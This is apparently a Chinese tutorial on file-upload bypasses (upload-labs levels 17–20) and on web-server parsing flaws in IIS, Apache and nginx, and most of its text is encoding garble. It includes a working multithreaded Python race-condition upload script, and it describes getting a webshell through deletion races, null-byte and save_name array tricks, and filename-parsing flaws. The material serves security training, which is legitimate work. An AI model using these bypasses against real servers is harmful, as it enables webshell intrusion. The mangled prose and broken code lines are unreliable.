â€œåªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼â€; unlink($upload_file); } }else{ $msg â€˜ä¸Šä¼ å‡ºé”™ï¼â€™; } } åˆ©ç”¨æ¡ä»¶ç«äº‰åˆ é™¤æ–‡ä»¶æ—¶é—´å·®ç»•è¿‡ã€‚ä½¿ç”¨å‘½ä»¤pip install hackhttpå®‰è£…hackhttpæ¨¡å—ï¼Œè¿è¡Œä¸‹é¢çš„Pythonä»£ç å³å¯ã€‚å¦‚æœè¿˜æ˜¯åˆ é™¤å¤ªå¿«ï¼Œå¯ä»¥é€‚å½“è°ƒæ•´çº¿ç¨‹å¹¶å‘æ•°ã€‚ #!usrbinenv python 2 # coding:utf-8 3 4 5 import hackhttp 6 from multiprocessing.dummy import Pool as ThreadPool 7 8 9 def upload(lists): 10 hh hackhttp.hackhttp() 11 raw â€œâ€â€POST upload-labsPass-17index.php HTTP1.1 12 Host: 127.0.0.1 13 User-Agent: Mozilla5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko20100101 Firefox49.0 14 Accept: texthtml,applicationxhtml+xml,applicationxml;q0.9,;q0.8 15 Accept-Language: zh-CN,zh;q0.8,en-US;q0.5,en;q0.3 16 Accept-Encoding: gzip, deflate 17 Referer: http://127.0.0.1/upload-labs/Pass-17/index.php 18 Cookie: pass17 19 Connection: close 20 Upgrade-Insecure-Requests: 1 21 Content-Type: multipartform-data; boundaryâ€”â€”â€”â€”â€”â€”â€”â€”â€“ -6696274297634 22 Content-Length: 341 23 24 â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“6696274297634 25 Content-Disposition: form-data; nameâ€upload_fileâ€; filenameâ€17.phpâ€ 26 Content-Type: applicationoctet-stream 27 28 29 â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“6696274297634 30 Content-Disposition: form-data; nameâ€submitâ€ 31 32 ä¸Šä¼  33 â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“6696274297634â€“ 34 â€œâ€â€ 35 code, head, html, redirect, log hh.http(â€˜http://127.0.0.1/upload\u0002labs/Pass-17/index.phpâ€˜, rawraw) 36 print(str(code) + â€œ\\râ€) 37 38 39 pool ThreadPool(10) 40 pool.map(upload, range(10000)) 41 pool.close() 42 pool.join() çœ‹ç¤ºä¾‹ï¼š è™½ç„¶æŠ¥é”™äº†ï¼Œä½†æ˜¯å…¶å®è¿™ä¸ªæ–‡ä»¶åˆ°è¿‡æœåŠ¡å™¨äº†ï¼Œåªæ˜¯ç¬é—´æ¶ˆå¤±äº†ï¼Œè¢«å¹²æ‰äº†ã€‚æˆ‘ä»¬burpæŠ“åŒ…æ¥çœ‹ï¼Œå°†åŒ…æ”¾åˆ°æµ‹è¯•å™¨ä¸­æ¥æŸ¥çœ‹ï¼Œåˆ«å¿˜äº†æ¸…æ¥šä¸€ä¸‹å˜é‡ ç„¶åè®¾ç½®å‚æ•° åœ¨è®¾ç½®ä¸€ä¸‹çº¿ç¨‹æ•°ï¼Œè®©ä»–å‘é€çš„å¿«ä¸€äº› è¿™é‡Œæˆ‘ä¸Šä¼ æˆ‘çš„tj.phpï¼Œç„¶åä¸åœçš„è®¿é—®test.phpä¸Šä¼ åçš„åœ°å€ï¼Œå³http://www.hack_upload.comuploadtest.php ç„¶åç‚¹å‡»å¼€å§‹æ”»å‡»ï¼Œæˆ‘ä»¬ç›¯ç€è¿™ä¸ªæ–‡ä»¶å¤¹ çœ‹åˆ°è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Šäº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åœ¨å®ƒåˆ é™¤æ–‡ä»¶ä¹‹å‰ï¼Œé€šè¿‡è¿™ä¸ªæ—¶é—´å·®æ¥æäº‹æƒ…ã€‚ è¿™é‡Œä½¿ç”¨ä¸¤ä¸ªå‘åŒ…å™¨ï¼Œä¸€ä¸ªåŒ…æ˜¯ä¸Šä¼ æˆ‘ä»¬test.phpçš„åŒ…ï¼Œä¸€ä¸ªæ˜¯è®¿é—®æˆ‘ä»¬ä¸Šä¼ test.phpåçš„åœ°å€ï¼Œä¸åœçš„è®¿é—®è¿™ä¸ªæ–‡ä»¶ã€‚æ¯ä¸€ä¸ªæµ‹è¯•å™¨çš„å‚æ•°éƒ½è®¾ç½®çš„é«˜ä¸€äº›ï¼Œ3000ä¸ªåŒ…ï¼Œ100ä¸ªçº¿ç¨‹ã€‚ç„¶åæˆ‘ä»¬å‘ç°tj.phpè¢«è®¿é—®äº†ï¼Œå¹¶ä¸”æ‰§è¡Œäº†ï¼Œç”Ÿæˆäº†qing.phpæ–‡ä»¶ é‚£ä¹ˆè¿™ä¸ªæ–‡ä»¶ä¸­å¦‚æœæœ‰æˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è·å¾—webshelläº†ã€‚æˆ‘ä»¬è®¿é—®ä¸€ä¸‹qing.phpï¼Œæ•ˆæœå‡ºæ¥äº†ã€‚ 3-18 ç¬¬åå…«å…³ï¼šæ¡ä»¶ç«äº‰ä¹‹é‡å‘½åç«äº‰è¿™ä¸€å…³æˆ‘ä»¬æ¼”ç¤ºä¸å‡ºæ¥æ˜‚ï¼Œå› ä¸ºæˆ‘æ²¡æœ‰å‡†å¤‡ä½ç‰ˆæœ¬çš„apacheï¼Œapache2.xä¹‹åçš„éƒ½ç®—æ˜¯é«˜ç‰ˆæœ¬çš„ã€‚è¿™é‡Œåˆ©ç”¨äº†ä½ç‰ˆæœ¬çš„apacheè§£ææ¼æ´ã€‚ åˆšå¼€å§‹æ²¡æœ‰æ‰¾åˆ°ç»•è¿‡æ–¹æ³•ï¼Œæœ€åä¸‹è½½ä½œè€…Githubæä¾›çš„æ‰“åŒ…ç¯å¢ƒï¼Œåˆ©ç”¨ä¸Šä¼ é‡å‘½åç«äº‰+Apacheè§£ææ¼æ´ï¼ŒæˆåŠŸç»•è¿‡ã€‚ ä¸Šä¼ åå­—ä¸º18.php.7Zçš„æ–‡ä»¶(å› ä¸ºè¯¥é¢˜çš„æºä»£ç ä¸­æ”¯æŒè¿™ä¸ªç±»å‹æ–‡ä»¶çš„ä¸Šä¼ ï¼Œæœ‰ç™½åå•)ï¼Œå¿«é€Ÿé‡å¤æäº¤è¯¥æ•°æ®åŒ…ï¼Œä¼šæç¤ºæ–‡ä»¶å·²ç»è¢«ä¸Šä¼ ï¼Œä½†æ²¡æœ‰è¢«é‡å‘½åã€‚apacheè§£ææ–‡ä»¶åç§°çš„æ—¶å€™ï¼Œæ˜¯ä»å³å¾€å·¦è§£æçš„ï¼Œå½“å®ƒçœ‹åˆ°ä¸è®¤è¯†çš„æ‰©å±•åæ—¶ï¼Œä»–å°±æ‰¾å‰é¢çš„æ‰©å±•åä½œä¸ºæ–‡ä»¶æ‰©å±•åï¼Œè¿™æ ·å®ƒå°±å½“æˆäº†18.phpäº†ã€‚ç›´æ¥ä¸Šä¼ ï¼Œæˆ‘ä»¬é€šè¿‡æŠ“åŒ…å·¥å…·çœ‹ä¸€ä¸‹ ä½ æ³¨æ„è§‚å¯Ÿuploadæ–‡ä»¶å¤¹ï¼Œæ³¨æ„è¿™æ˜¯ç½‘ç«™æ ¹ç›®å½•çš„é‚£ä¸ªuploadæ–‡ä»¶å¤¹ï¼Œä¸æ˜¯æ ¹ç›®å½•ä¸­çš„é‚£ä¸ªuploadæ–‡ä»¶å¤¹æ˜‚ï¼Œå‘ç°è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ ä¸Šå»ä¹‹åï¼Œè¢«é‡å‘½åäº†ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬ç°åœ¨å…¶å®ç©çš„ä¹Ÿæ˜¯æ—¶é—´ç«äº‰ã€‚æˆ‘ä»¬å¦‚æœå°†åŒ…å‘åˆ°burpçš„æµ‹è¯•å™¨ä¸­ï¼Œå‘é€3000ä¸ªåŒ…ï¼Œ100ä¸ªçº¿ç¨‹å‘é€ï¼Œé‚£ä¹ˆæœ‰äº›æ–‡ä»¶æ˜¯æ²¡æœ‰æ¥å¾—åŠè¢«é‡å‘½åçš„ï¼Œä½†æ˜¯æˆ‘ä»¬ç›´æ¥è®¿é—®è¿™ä¸ªæ–‡ä»¶çš„æ—¶å€™ä½ å‘ç°å…¶å®æ–‡ä»¶è¿˜æ˜¯ä¸èƒ½è¢«è§£æçš„ å› ä¸ºæˆ‘ä»¬ä½¿ç”¨çš„phpstudyä¸­çš„apacheæ˜¯æ²¡æœ‰è¿™ä¸ªæ¼æ´çš„äº†ï¼Œæ‰€ä»¥çœ‹ä¸å‡ºæ•ˆæœã€‚ä½†æ˜¯é€šè¿‡å…¶ä»–æ–¹å¼æ­å»ºçš„apacheï¼Œå®ƒæ˜¯æœ‰ä¸€ä¸ªæ¼æ´çš„ï¼Œå› ä¸ºapacheèƒ½è§£æupload1.php.7zçš„ï¼Œè‡ªåŠ¨è§£ææˆäº†phpæ–‡ä»¶ã€‚ å¿«é€Ÿæäº¤ä¸Šé¢çš„æ•°æ®åŒ…ï¼Œå¯ä»¥è®©æ–‡ä»¶åå­—ä¸è¢«é‡å‘½åä¸Šä¼ æˆåŠŸã€‚ ç„¶ååˆ©ç”¨Apacheçš„è§£ææ¼æ´ï¼Œå³å¯è·å¾—shell 3-19 ç¬¬åä¹å…³åŸç†åŒPass-11**ï¼Œä¸Šä¼ çš„æ–‡ä»¶åç”¨0x00ç»•è¿‡ã€‚æ”¹æˆ19.phpã€äºŒè¿›åˆ¶00ã€‘.1.jpgï¼Œè¿™é‡Œå°±ä¸åœ¨æ¼”ç¤ºäº†ã€‚ 3-20 ç¬¬äºŒåå…³Pass-20æ¥æºäºCTFï¼Œè¯·å®¡è®¡ä»£ç ï¼è¿™æ˜¯ä»£ç å®¡è®¡å‡ºæ¥çš„æ¼æ´ï¼Œç›´æ¥æ¸—é€æµ‹è¯•å…¶å®å¾ˆéš¾å‘ç°çš„ï¼Œè¿™ä¸ªæ¼æ´ æˆ‘ä»¬å°±ä¸è®²äº†ï¼Œä»¥åæˆ‘ä»¬åœ¨è®²ä»£ç å®¡è®¡çš„å·¥ä½œã€‚ $is_upload false; $msg null; if(!empty($_FILES[â€˜upload_fileâ€™])){ æ£€æŸ¥MIME $allow_type array(â€˜imagejpegâ€™,â€™imagepngâ€™,â€™imagegifâ€™); if(!in_array($_FILES[â€˜upload_fileâ€™][â€˜typeâ€™],$allow_type)){ $msg â€œç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!â€; }else{ æ£€æŸ¥æ–‡ä»¶å $file empty($_POST[â€˜save_nameâ€™]) ? $_FILES[â€˜upload_fileâ€™][â€˜nameâ€™] : $_POST[â€˜save_nameâ€™]; if (!is_array($file)) { $file explode(â€˜.â€™, strtolower($file)); } $ext end($file); $allow_suffix array(â€˜jpgâ€™,â€™pngâ€™,â€™gifâ€™); if (!in_array($ext, $allow_suffix)) { $msg â€œç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!â€; }else{ $file_name reset($file) . â€˜.â€™ . $file[count($file) - 1]; $temp_file $_FILES[â€˜upload_fileâ€™][â€˜tmp_nameâ€™]; $img_path UPLOAD_PATH . â€˜â€˜ .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $msg â€œæ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼â€; $is_upload true; } else { $msg â€œæ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼â€; } } } }else{ $msg â€œè¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼â€; } è§£é¢˜æ€è·¯:è¿™ä¸ªæ€è·¯å¤§å®¶è‡ªå·±çœ‹çœ‹å°±è¡Œäº†ï¼Œæˆ‘ä»¬ç›´æ¥çœ‹æ¼”ç¤ºæ•ˆæœï¼Œä¹Ÿå°±æ˜¯è§£é¢˜æ­¥éª¤ã€‚ æ–‡ä»¶å‘½åè§„åˆ™ï¼š$file_name reset($file) . â€˜.â€™ . $file[count($file) - 1]; reset():å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚ end():å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚ $file empty($_POST[â€˜save_nameâ€™]) ? $_FILES[â€˜upload_fileâ€™][â€˜nameâ€™] : $_POST[â€˜save_nameâ€™]; å¦‚æœsave_nameä¸ä¸ºç©ºåˆ™fileä¸ºsave_name,å¦åˆ™fileä¸ºfilename if (!is_array($file))åˆ¤æ–­å¦‚æœfileä¸æ˜¯æ•°ç»„åˆ™ä»¥â€™.â€™åˆ†ç»„ æ–‡ä»¶åå‘½åè§„åˆ™$file_name reset($file) . â€˜.â€™ . $file[count($file) - 1]; æˆ‘ä»¬POSTä¼ å…¥ä¸€ä¸ªsave_nameåˆ—è¡¨ï¼š[â€˜info20.phpâ€™, â€˜â€™, â€˜jpgâ€™],æ­¤æ—¶ empty($_POST[â€˜save_nameâ€™]) ä¸ºå‡åˆ™fileä¸ºsave_nameï¼Œæ‰€ä»¥ç”±$ext end($file);ä¸ºjpgå¯ä»¥é€š è¿‡åç¼€ååˆ¤æ–­ï¼ˆåˆ¤æ–­ç»“æŸåæœ€åä¸€ä¸ªå…ƒç´ jpgå¼¹å‡ºï¼‰ï¼Œå¹¶ä¸”æœ€ç»ˆæ–‡ä»¶åç»„è£…ä¸ºupload20.php. è§£é¢˜æ­¥éª¤ ä¸Šä¼ åŒ…æ•°æ®ä¸ºï¼Œé‚£ä¸ª1.jpgå…¶å®æ˜¯1.phpæ”¹çš„åå­—ï¼Œä¸ºäº†ä¸Šä¼ çš„æ—¶å€™é€šè¿‡å‰ç«¯jsæ ¡éªŒè€Œå·²ï¼Œé‡Œé¢æœ‰æœ¨é©¬ï¼Œé‡ç‚¹è¦é€šè¿‡åç«¯æ ¡éªŒï¼Œæˆ‘ä»¬æŠ“åŒ…çœ‹æ•ˆæœ è¿˜è¦æ³¨æ„ï¼Œä¸Šä¼ çš„æ—¶å€™ï¼Œæç¤ºä½ æ–‡ä»¶ä¿å­˜åäº† ä¿®æ”¹åŒ…æ•°æ® æŸ¥çœ‹uploadæ–‡ä»¶å¤¹ æ–‡ä»¶å°±ä¸Šä¼ ä¸Šæ¥äº†ï¼Œæå®šã€‚å…¶å®ä¸»è¦æ˜¯åˆ†ææºä»£ç æ‰¾åˆ°çš„æ¼æ´ã€‚ æ–‡ä»¶åŒ…å«æ¼æ´å’ŒwebæœåŠ¡å™¨ç¨‹åºè§£ææ¼æ´æ¥å®ç°çš„ã€‚é»‘åå•çš„é˜²å¾¡ï¼ŒåŸºæœ¬éƒ½å¯ä»¥ç»•è¿‡ã€‚ä»¥åçœ‹åˆ°æ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ï¼Œå¤§å®¶å°±å¯ä»¥æŒ‰ç…§å‡ ç§æ‰‹æ®µæ¥è¿›è¡Œå°è¯•æµ‹è¯•ã€‚ç™½åå•çš„ç»•è¿‡æ–¹å¼ï¼Œå…¶å®åŸºæœ¬ä¸Šéƒ½éœ€è¦phpçš„ç‰ˆæœ¬æ¯”è¾ƒä½ï¼Œä½äº5.4çš„ã€å¹¶ä¸”é­”æœ¯ç¬¦å·åŠŸèƒ½æ²¡æœ‰æ‰“å¼€ï¼Œä¸¤ä¸ªæ¡ä»¶æ‰è¡Œï¼Œé«˜ç‰ˆæœ¬çš„phpåŸºæœ¬æ²¡æœ‰è¿™ç§ç™½åå•æ¼æ´äº†ã€‚æˆ‘ä»¬åŸºæœ¬æ˜¯æŒ‰ç…§ctfè€ƒé¢˜æ¥å­¦ä¹ çš„ï¼Œæ‰€æœ‰æ–‡ä»¶ä¸Šä¼ æ¼æ´æ–¹å¼åŸºæœ¬éƒ½æ¶µç›–äº†ã€‚ ä¸‹é¢æˆ‘ä»¬å»å­¦ä¹ ä¸€ä¸‹webæœåŠ¡ç¨‹åºçš„è§£ææ¼æ´ï¼Œçœ‹ä¸‹ä¸€ç« ã€‚ 9-4 WebæœåŠ¡ç¨‹åºè§£ææ¼æ´9-4-1 0x00 æ€»è§ˆè¯´æ˜æœåŠ¡å™¨è§£ææ¼æ´ç®—æ˜¯å†å²æ¯”è¾ƒæ‚ ä¹…äº†ï¼Œä½†å¦‚ä»Šä¾ç„¶å¹¿æ³›å­˜åœ¨ã€‚åœ¨æ­¤è®°å½•æ±‡æ€»ä¸€äº›å¸¸è§æœåŠ¡å™¨ï¼ˆWEB serverï¼‰çš„è§£ææ¼æ´ï¼Œæ¯”å¦‚IIS6.0ã€IIS7.5ã€apacheã€nginxç­‰æ–¹ä¾¿ä»¥åå›é¡¾æ¸©ä¹ ã€‚ 9-4-2 IIS5.x-6.xè§£ææ¼æ´## ä½¿ç”¨iis5.x-6.xç‰ˆæœ¬çš„æœåŠ¡å™¨ï¼Œå¤§å¤šä¸ºwindows server 2003ï¼Œç½‘ç«™æ¯”è¾ƒå¤è€ï¼Œå¼€å‘è¯­å¥ä¸€èˆ¬ä¸ºaspï¼›è¯¥è§£ææ¼æ´ä¹Ÿåªèƒ½è§£æaspæ–‡ä»¶ï¼Œè€Œä¸èƒ½è§£æaspxæ–‡ä»¶ã€‚win7-win10ä¸­å¤šä¸ºiis7.x-8.xäº†ï¼Œç‰ˆæœ¬æ¯”è¾ƒé«˜ã€‚ ç›®å½•è§£æ(6.0) å½¢å¼ï¼šwww.xxx.com/xx.asp/xx.jpg åŸç†: æœåŠ¡å™¨é»˜è®¤ä¼šæŠŠ.aspï¼Œ.asaç›®å½•ä¸‹çš„æ–‡ä»¶éƒ½è§£ææˆaspæ–‡ä»¶ã€‚ æ–‡ä»¶è§£æ å½¢å¼ï¼šwww.xxx.com/xx.asp;.jpg åŸç†ï¼šæœåŠ¡å™¨é»˜è®¤ä¸è§£æ;å·åé¢çš„å†…å®¹ï¼Œå› æ­¤xx.asp;.jpgä¾¿è¢«è§£ææˆaspæ–‡ä»¶äº†ã€‚ è§£ææ–‡ä»¶ç±»å‹ IIS6.0 é»˜è®¤çš„å¯æ‰§è¡Œæ–‡ä»¶é™¤äº†aspè¿˜åŒ…å«è¿™ä¸‰ç§ : test.asa test.cer test.cdx ä¿®å¤æ–¹æ¡ˆ 1.ç›®å‰å°šæ— å¾®è½¯å®˜æ–¹çš„è¡¥ä¸ï¼Œå¯ä»¥é€šè¿‡è‡ªå·±ç¼–å†™æ­£åˆ™ï¼Œé˜»æ­¢ä¸Šä¼ xx.asp;.jpgç±»å‹çš„æ–‡ä»¶åã€‚ 2.åšå¥½æƒé™è®¾ç½®ï¼Œé™åˆ¶ç”¨æˆ·åˆ›å»ºæ–‡ä»¶å¤¹ã€‚ ç¤ºä¾‹ï¼š win2003ä¸­çš„iisé»˜è®¤æ˜¯å­˜åœ¨ä¸€äº›æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„ï¼Œæˆ‘ä»¬æ¼”ç¤ºä¸€ä¸‹ï¼š 1.ç›®å½•è§£æï¼šæ–°å»ºä¸€ä¸ªxx.aspæ–‡ä»¶å¤¹ï¼Œ æœåŠ¡å™¨é»˜è®¤ä¼šæŠŠ.aspï¼Œ.asaç›®å½•ä¸‹çš„ä»»æ„åç¼€åçš„æ–‡ä»¶éƒ½è§£ææˆaspæ–‡ä»¶ã€‚è¿™ä¸ªæˆ‘ä»¬æ˜¨å¤©æ¼”ç¤ºè¿‡äº†çš„ã€‚è¿™ä¸ªæœ‰ä¸ªå‰ææ¡ä»¶ï¼Œå°±æ˜¯ç”¨æˆ·å¯¹ç›®å½•æœ‰ä¿®æ”¹æƒé™ã€‚å¦‚æœæˆ‘ä»¬é€šè¿‡æŠ“åŒ…å·¥å…·æŠ“åŒ…ï¼Œå‘ç°å…¶ä¸­çš„ç›®å½•æ˜¯å¯ä»¥é€šè¿‡è¯·æ±‚æ¥æ”¹å˜çš„ï¼Œé‚£ä¹ˆè¿™ç§æƒ…å†µä¸‹ï¼Œå¾ˆæœ‰å¯èƒ½æˆåŠŸã€‚ 2.æ–‡ä»¶è§£æï¼šå½¢å¼ï¼šwww.xxx.com/xx.asp;.jpgï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬å°†æŸä¸ªaspæ–‡ä»¶æ”¹ä¸ºxx.asp;.jpgï¼Œé‚£ä¹ˆiisèƒ½å¤Ÿå¯¹è¿™ä¸ªæ–‡ä»¶ç±»å‹è¿›è¡Œè§£æã€‚ æ¯”å¦‚æˆ‘ä»¬å°†ç½‘ç«™çš„index.aspæ–‡ä»¶æ”¹ä¸ºindex.asp;.jpg è®¿é—®ä¸€ä¸‹çœ‹æ•ˆæœï¼š 3.è§£ææ–‡ä»¶ç±»å‹ ## IIS6.0 é»˜è®¤çš„å¯æ‰§è¡Œæ–‡ä»¶é™¤äº†aspè¿˜åŒ…å«è¿™ä¸‰ç§ :ä¹Ÿéƒ½æ˜¯å½“ä½œè„šæœ¬æ¥è§£æï¼Œä¸€èˆ¬å¼€å‘äººå‘˜åšé»‘åå•çš„æ—¶å€™ï¼Œä¸ä¼šå°†å¦‚ä¸‹ä¸‰ä¸ªåç¼€åæ–‡ä»¶åŠ å…¥åˆ°é»‘åå•ï¼Œå¯¼è‡´æ¼æ´ test.asa test.cer test.cdx çœ‹ç¤ºä¾‹ï¼š æ¯”å¦‚è¿˜æ˜¯å°†index.aspæ”¹ä¸ºindex.ceræ–‡ä»¶ è®¿é—®æ•ˆæœï¼š ceræ–‡ä»¶ä¸€èˆ¬æ˜¯è¯ä¹¦æ–‡ä»¶ï¼Œiisé»˜è®¤ä¹Ÿæ˜¯å¯ä»¥è§£æçš„ï¼Œæˆ‘ä»¬æ¥çœ‹ç½‘ç«™å±æ€§ é«˜ç‰ˆæœ¬çš„iisï¼Œæ¯”å¦‚iis7.5çš„è§£ææ¼æ´ï¼Œæˆ‘ä»¬ä¸€ä¼šå†çœ‹ï¼Œå…ˆçœ‹çœ‹apacheçš„ã€‚ 9-4-3 apacheè§£ææ¼æ´æ¼æ´åŸç† ## Apache è§£ææ–‡ä»¶çš„è§„åˆ™æ˜¯ä»å³åˆ°å·¦å¼€å§‹åˆ¤æ–­è§£æ,å¦‚æœåç¼€åä¸ºä¸å¯è¯†åˆ«æ–‡ä»¶è§£æ,å°±å†å¾€å·¦åˆ¤æ–­ã€‚æ¯”å¦‚test.php.owf.rar â€œ.owfâ€å’Œâ€.rarâ€ è¿™ä¸¤ç§åç¼€æ˜¯apacheä¸å¯è¯†åˆ«è§£æ,apacheå°±ä¼šæŠŠxx.php.owf.rarè§£ææˆphpã€‚ ## æ¼æ´å½¢å¼ www.xxxx.xxx.com/test.php.php123è¿™ä¸ªæ¼æ´å½“æ—¶é€šæ€äº†æ‰€æœ‰çš„apacheæ­å»ºçš„ç½‘ç«™ã€‚ ## å…¶ä½™é…ç½®é—®é¢˜å¯¼è‡´æ¼æ´ ## ï¼ˆ1ï¼‰å¦‚æœåœ¨ Apache çš„ conf é‡Œæœ‰è¿™æ ·ä¸€è¡Œé…ç½® AddHandler php5-script .php è¿™æ—¶åªè¦æ–‡ä»¶åé‡ŒåŒ…å«.php å³ä½¿æ–‡ä»¶åæ˜¯ test2.php.jpg ä¹Ÿä¼šä»¥ php æ¥æ‰§è¡Œã€‚ ## ï¼ˆ2ï¼‰å¦‚æœåœ¨ Apache çš„ conf é‡Œæœ‰è¿™æ ·ä¸€è¡Œé…ç½® AddType applicationx-httpd-php .jpg å³ä½¿æ‰©å±•åæ˜¯ jpgï¼Œä¸€æ ·èƒ½ä»¥ php æ–¹å¼æ‰§è¡Œã€‚xx.jpg 1. ç¤ºä¾‹ï¼šwww.xxxx.xxx.com/test.php.php123 æ¯”å¦‚æˆ‘ä»¬å°†sql.phpæ”¹ä¸ºsql.php.xxxxï¼Œæ­£å¸¸æ¥è®²çš„è¯æ˜¯ä¸èƒ½è§£æçš„ï¼Œä½†æ˜¯è€ç‰ˆæœ¬çš„apache(apache2.2ç‰ˆæœ¬åŠä¹‹å‰çš„)æ˜¯èƒ½å¤Ÿæ­£å¸¸å°†è¿™ä¸ªæ–‡ä»¶è§£æä¸ºphpæ–‡ä»¶çš„ æˆ‘ç”¨çš„æ˜¯æ–°ç‰ˆæœ¬çš„apacheï¼Œæ²¡æ­å»ºè€ç‰ˆæœ¬çš„ï¼Œæ‰€ä»¥è¿™ä¸ªæ¼æ´å¤§å®¶å°±è®°ä½ä»–å°±è¡Œäº†ï¼Œå½“ç„¶ï¼Œæ–°ç‰ˆæœ¬çš„apacheå¦‚æœé…ç½®ä¸å½“ä¹Ÿä¼šå¼•èµ·è¿™ä¸ªæ¼æ´ï¼Œæœ‰å…´è¶£çš„å¤§å®¶å¯ä»¥å»å®‰è£…ä¸€ä¸ªä½ç‰ˆæœ¬çš„apacheæ¥ç©ç©ï¼Œä½ çœ‹æ–°ç‰ˆæœ¬çš„å°±ä¸è§£æè¿è¡Œä»£ç äº†ï¼Œç›´æ¥æŠŠæºä»£ç ç»™ä½ çœ‹ï¼Œè€Œä¸æ˜¯å°†æºä»£ç æ‰§è¡Œäº†ã€‚ä»¥å‰å¤§å®¶é€šè¿‡é»‘åå•çš„æ–¹å¼æ¥é˜²å¾¡çš„ï¼ŒåŸºæœ¬éƒ½æŒ‚äº†ï¼Œå› ä¸ºä½ å‘ç°åç¼€åä½ éšæ„å†™ã€‚ 2.å…¶ä½™é…ç½®é—®é¢˜å¯¼è‡´æ¼æ´ ## ï¼ˆ1ï¼‰å¦‚æœåœ¨ Apache çš„ conf é‡Œæœ‰è¿™æ ·ä¸€è¡Œé…ç½® AddHandler php5-script .php è¿™æ—¶åªè¦æ–‡ä»¶åé‡ŒåŒ…å«.php å³ä½¿æ–‡ä»¶åæ˜¯ test2.php.jpg ä¹Ÿä¼šä»¥ php æ¥æ‰§è¡Œã€‚ ## ï¼ˆ2ï¼‰å¦‚æœåœ¨ Apache çš„ conf é‡Œæœ‰è¿™æ ·ä¸€è¡Œé…ç½® AddType applicationx-httpd-php .jpg å³ä½¿æ‰©å±•åæ˜¯ jpgï¼Œä¸€æ ·èƒ½ä»¥ php æ–¹å¼æ‰§è¡Œã€‚ è¿™ä¸¤ä¸ªæ¼æ´ä¸æ˜¯apacheè‡ªèº«çš„é—®é¢˜ï¼Œè€Œæ˜¯è¿ç»´äººå‘˜è¿›è¡Œé…ç½®æ—¶ï¼Œè‡ªå·±é…ç½®çš„å‡ºäº†é—®é¢˜ã€‚ è¿™é‡Œå°±ä¸æ¼”ç¤ºäº†ï¼Œæ¥ä¸‹æ¥çœ‹nginxçš„è§£ææ¼æ´ã€‚ ä¿®å¤æ–¹æ¡ˆ 1.apacheé…ç½®æ–‡ä»¶ï¼Œç¦æ­¢.php.è¿™æ ·çš„æ–‡ä»¶æ‰§è¡Œï¼Œé…ç½®æ–‡ä»¶é‡Œé¢åŠ å…¥ Order Allow,Deny Deny from all 2.ç”¨ä¼ªé™æ€èƒ½è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œé‡å†™ç±»ä¼¼.php.è¿™ç±»æ–‡ä»¶ï¼Œæ‰“å¼€apacheçš„httpd.confæ‰¾åˆ°LoadModule rewrite_module modulesmod_rewrite.soæŠŠ#å·å»æ‰ï¼Œé‡å¯apache,åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹å»ºç«‹.htaccessæ–‡ä»¶,ä»£ç å¦‚ä¸‹: RewriteEngine On RewriteRule .(php.|php3.) index.php RewriteRule .(pHp.|pHp3.) index.php RewriteRule .(phP.|phP3.) index.php RewriteRule .(Php.|Php3.) index.php RewriteRule .(PHp.|PHp3.) index.php RewriteRule .(PhP.|PhP3.) index.php RewriteRule .(pHP.|pHP3.) index.php RewriteRule .(PHP.|PHP3.) index.php 9-4-4 nginxè§£ææ¼æ´å¤§è‡´åŸç†ï¼šè¯¥æ¼æ´ä¸nginxã€phpç‰ˆæœ¬æ— å…³ï¼Œå±äºé…ç½®ä¸å½“é€ æˆçš„è§£ææ¼æ´ã€‚ ## å½“php.inié…ç½®æ–‡ä»¶ä¸­å¼€å¯äº†cgi.fix_pathinfoï¼Œè¯¥å€¼é»˜è®¤ä¸º1ï¼Œè¡¨ç¤ºå¼€å¯ã€‚çœ‹åå­—å¤§æ¦‚çŸ¥é“æ˜¯å¤„ç†è·¯å¾„ç”¨çš„é…ç½®ã€‚ ## æ¯”å¦‚æˆ‘ä»¬ä¸Šä¼ äº†ä¸€ä¸ªæœ¨é©¬æ–‡ä»¶web.jpgï¼Œå› ä¸ºweb.phpä¸èƒ½ä¸Šä¼ ï¼Œç°åœ¨æˆ‘ä»¬æƒ³æ‰§è¡Œè¿™ä¸ªweb.jpgï¼Œå¯ä»¥å¦‚ä¸‹è·¯å¾„è®¿é—® http://192.168.2.104/pikachu/web.jpg/aaa.php ## è€Œç›®æ ‡æœåŠ¡å™¨ä¸Šæ²¡æœ‰aaa.phpæ–‡ä»¶ï¼Œæœ¬æ¥å¦‚æœnginx.confçš„é…ç½®æ²¡æœ‰é—®é¢˜çš„è¯ï¼Œnginxä¼šå…ˆå»æ‰¾ä¸‹è¿™ä¸ªæ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨ï¼Œåœ¨æ‰¾phpè§£é‡Šå™¨æ¥è§£é‡Šæ‰§è¡Œä»£ç 